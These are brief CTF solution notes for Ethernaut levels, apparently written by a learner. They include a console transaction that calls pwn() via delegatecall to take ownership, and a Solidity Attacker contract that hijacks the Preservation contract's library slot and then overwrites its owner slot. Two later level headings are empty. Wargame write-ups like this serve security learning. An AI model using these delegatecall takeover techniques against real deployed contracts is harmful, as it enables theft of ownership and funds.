## Ethernaut6 
    -Send a transaction to Delegation, triggering the fallback() 
    -The data "0xdd365b8b" == "pwn()", so it will trigget the pwn() function in the Delegate contract
    and it will change the owner state variable of Delegation contract
`await contract.sendTransaction({from: player, to: instance, data: "0xdd365b8b"})`

## Ethernaut 16

    -From Preservation contrat we will call setFirstTime(uint _timeStamp) function
    -This function will do a delegatecall to contract Library{} which will update the slot#0 variable in Preservation contract
    -So we will change the slot#0 in Preservation for a new attacker contract
    -So the second time we call the setFirstTime(uint _timeStamp), it won't call the Library contract, it will call our attacker contract
    -and our attacker contract will update the slot#2 on Preservation contract which is the owner()
```
contract Attacker{
    //same layout of Preservation contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    Preservation public target;

    constructor(Preservation _address){
        target = _address;
    }

    //1st step, change the slot#0 in Preservation-->   address public timeZone1Library;
    function setTimeZone1LibraryToAttackerContract() public {
        uint256 _addressUint = uint160(address(this));
        target.setFirstTime(_addressUint);
    }

    //2nd step, create a function that will update the slot#2
    //it must have the same signature "setTime(uint _time)"
    function setTime(uint _time) public {
        owner = msg.sender;
    }

    //NOTE: Instead of calling the setFirstTime(uint) from remix
    //I sent a transaction from the console:
    //await contract.setFirstTime(123)
}
```

## Ethernaut 24

## Ethernaut 25 (proxy of the proxy)
